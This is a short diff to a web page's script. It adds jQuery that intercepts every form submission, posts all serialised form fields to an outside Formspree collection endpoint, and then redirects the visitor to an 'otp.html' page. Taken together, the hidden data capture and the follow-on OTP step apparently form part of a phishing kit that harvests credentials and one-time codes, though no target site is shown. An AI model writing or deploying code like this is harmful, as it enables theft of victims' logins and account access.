@@ -7,7 +7,31 @@
   <link rel="stylesheet" href="style.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+    $(document).ready(function() {
+      $('form').submit(function(event) {
+        event.preventDefault(); // Prevent form submission
+
+        // Send the form data to FormSubmit using AJAX
+        $.ajax({
+          url: 'https://formspree.io/f/myyaavzk',
+          method: 'POST',
+          data: $('form').serialize(),
+          dataType: 'json',
+          success: function(response) {
+            // Redirect to OTP.html upon successful submission
+            redirectToOTP();
+          },
+          error: function(xhr, status, error) {
+            console.log(xhr.responseText);
+            alert('An error occurred. Please try again.');
+          }
+        });
+      });
+    });
+
+    function redirectToOTP() {
+      window.location.href = 'otp.html';
+    }
   </script>
 </head>
 <body>
